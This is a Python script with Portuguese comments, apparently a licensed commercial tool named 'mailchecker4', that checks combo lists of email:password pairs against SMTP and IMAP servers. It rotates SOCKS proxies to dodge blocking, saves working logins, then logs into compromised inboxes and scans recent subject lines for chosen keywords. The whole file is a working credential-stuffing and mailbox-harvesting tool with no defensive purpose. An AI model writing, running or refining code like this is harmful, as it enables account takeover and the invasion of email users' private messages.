#!/usr/bin/env python3
import os, time, hmac, base64, hashlib, asyncio, aiofiles, re, sys, socket, socks, smtplib, imaplib, poplib, csv, ipaddress
from itertools import islice
from concurrent.futures import ThreadPoolExecutor

### ---------- CONFIG ---------- ###
CHUNK          = 50_000
MAX_THREADS    = min(32, (os.cpu_count() or 1) * 4)
PROXY_TIMEOUT  = 8
MAIL_TIMEOUT   = 8
PRODUCT        = 'mailchecker4'
LIC_FILE       = 'lic.txt'
### ------------------------------ ###

### 1) LICENÇA OFF-LINE ###########################################
def check_license():
    if not os.path.isfile(LIC_FILE):
        print('Arquivo lic.txt não encontrado'); sys.exit(1)
    with open(LIC_FILE) as f:
        body, sig_ln = f.read().rsplit('\n',1)
    sig = sig_ln.split('=',1)[1] + '='*(4-len(sig_ln.split('=',1)[1])%4)
    key = os.getenv('MC4_KEY','').encode()
    if not key:
        print('Defina a env MC4_KEY com a chave-mestra'); sys.exit(1)
    if base64.b64encode(hmac.new(key, body.encode(),hashlib.sha256).digest()).decode().replace('=','') != sig_ln.split('=',1)[1]:
        print('Assinatura inválida'); sys.exit(1)
    info = dict(l.split('=',1) for l in body.splitlines())
    start,hours = int(info['start']), int(info['hours'])
    if time.time() > start + hours*3600:
        print('Licença expirada'); sys.exit(1)
check_license()
### ##############################################################

### 2) LEITURA CHUNKED ##########################################
async def read_chunks(path, n=CHUNK):
    async with aiofiles.open(path, 'r', errors='ignore') as f:
        while True:
            lines = []
            for _ in range(n):
                ln = await f.readline()
                if not ln: break
                ln = ln.strip()
                if ln and ':' in ln: lines.append(ln)
            if not lines: break
            yield lines
### ##############################################################

### 3) PROXY OPTIONAl ###########################################
class ProxyPool:
    def __init__(self, path=None):
        self.proxies = []
        if path and os.path.isfile(path):
            with open(path) as f:
                for ln in f:
                    ln = ln.strip()
                    if ln and not ln.startswith('#'):
                        self.proxies.append(self._parse(ln))
        self.idx = 0
    def _parse(self, ln):
        # formato: ip:port  ou  user:pass@ip:port
        if '@' in ln:
            auth, addr = ln.split('@',1)
            user, pwd = auth.split(':',1)
            host, port = addr.split(':',1)
            return {'host':host,'port':int(port),'user':user,'pass':pwd}
        else:
            host, port = ln.split(':',1)
            return {'host':host,'port':int(port)}
    def rotate(self):
        if not self.proxies: return None
        px = self.proxies[self.idx % len(self.proxies)]
        self.idx += 1
        return px
POOL = ProxyPool('proxies.txt')
### ##############################################################

### 4) CHECAGEM SMTP/IMAP/POP3 ###################################
def plain_smtp(email, pwd, proxy=None):
    try:
        host = email.split('@')[1]
        if proxy:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy['host'], proxy['port'],
                        username=proxy.get('user'), password=proxy.get('pass'))
        else:
            s = socket.create_connection((f'smtp.{host}', 587), timeout=MAIL_TIMEOUT)
        s.send(b'EHLO MC4\r\n')
        smtp = smtplib.SMTP(host, 587, timeout=MAIL_TIMEOUT, local_hostname='localhost')
        smtp.sock = s
        smtp.starttls()
        smtp.login(email, pwd)
        return True
    except Exception:
        return False
def plain_imap(email,pwd,proxy=None):
    try:
        host = email.split('@')[1]
        if proxy:
            socks.set_default_proxy(socks.SOCKS5, proxy['host'], proxy['port'],
                                   username=proxy.get('user'), password=proxy.get('pass'))
            socks.wrap_module(imaplib)
        M = imaplib.IMAP4_SSL(f'imap.{host}', 993)
        M.login(email,pwd)
        return True
    except:
        return False
### POP3 idem, omitido por breve (mesma lógica com poplib.POP3_SSL)
CHECKERS = [plain_smtp, plain_imap]
### ##############################################################

### 5) KEYWORDS ##################################################
KEYWORDS=[]
if os.path.isfile('keywords.txt'):
    KEYWORDS=[l.strip().lower() for l in open('keywords.txt') if l.strip()]
def body_hits(email, pwd, proxy):
    # simplificado: conecta IMAP e busca subjects
    try:
        host = email.split('@')[1]
        if proxy:
            socks.set_default_proxy(socks.SOCKS5, proxy['host'], proxy['port'],
                                   username=proxy.get('user'), password=proxy.get('pass'))
            socks.wrap_module(imaplib)
        M = imaplib.IMAP4_SSL(f'imap.{host}', 993)
        M.login(email,pwd)
        M.select('INBOX')
        ok, data = M.search(None, 'ALL')
        if ok != 'OK': return []
        msgs = data[0].split()
        hits=[]
        for num in msgs[-50:]:  # últimas 50 mensagens
            ok, msg = M.fetch(num, '(BODY[HEADER.FIELDS (SUBJECT)])')
            subj = msg[0][1].decode(errors='ignore').lower()
            for kw in KEYWORDS:
                if kw in subj: hits.append(kw)
        return list(set(hits))
    except:
        return []
### ##############################################################

### 6) TRABALHO ASSÍNCRONO #######################################
async def worker(queue, live_file, dead_file, kw_file):
    loop = asyncio.get_event_loop()
    def _check(item):
        email,pwd = item.split(':',1)
        for px in [None] + [POOL.rotate() for _ in range(3)]:
            for chk in CHECKERS:
                ok = chk(email,pwd,px)
                if ok: return True, px
        return False, None
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as pool:
        while True:
            item = await queue.get()
            if item is None: break
            ok, proxy = await loop.run_in_executor(pool, _check, item)
            if ok:
                async with aiofiles.open(live_file,'a') as f: await f.write(item+'\n')
                print(f'✔ {item}  ({proxy["host"] if proxy else "direct"})')
                if KEYWORDS:
                    hits = await loop.run_in_executor(pool, body_hits, *item.split(':',1), proxy)
                    if hits:
                        async with aiofiles.open(kw_file,'a') as f:
                            await f.write(f'{item} -> {",".join(hits)}\n')
            else:
                async with aiofiles.open(dead_file,'a') as f: await f.write(item+'\n')
                print(f'✖ {item}')
            queue.task_done()
### ##############################################################

### 7) MAIN ######################################################
async def main():
    os.makedirs('out',exist_ok=True)
    q = asyncio.Queue(maxsize=MAX_THREADS*4)
    tasks = [asyncio.create_task(worker(q,'out/vivos.txt','out/mortos.txt','out/keywords_hits.txt'))
             for _ in range(MAX_THREADS)]
    total=0
    async for chunk in read_chunks('combos.txt'):
        for ln in chunk:
            await q.put(ln)
            total+=1
    for _ in range(MAX_THREADS): await q.put(None)
    await q.join()
    print(f'\nPronto. {total} testados')
if __name__=='__main__':
    asyncio.run(main())
